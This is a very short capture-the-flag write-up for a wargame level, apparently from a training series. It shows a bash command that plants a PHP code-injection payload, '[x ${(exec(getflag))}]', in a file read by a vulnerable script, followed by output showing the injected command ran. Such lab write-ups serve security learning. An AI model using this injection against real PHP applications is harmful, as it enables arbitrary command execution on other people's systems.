in the ~/ we got 2 files: 
- binary level06 (name of file to open and send to php)
- level06.php

```bash
echo '[x ${(exec(getflag))}]' > /tmp/p
./level06 /tmp/p
```

PHP Notice:  Undefined variable: Check flag.Here is your token : in /home/user/level06/level06.php(4) : regexp code on line 1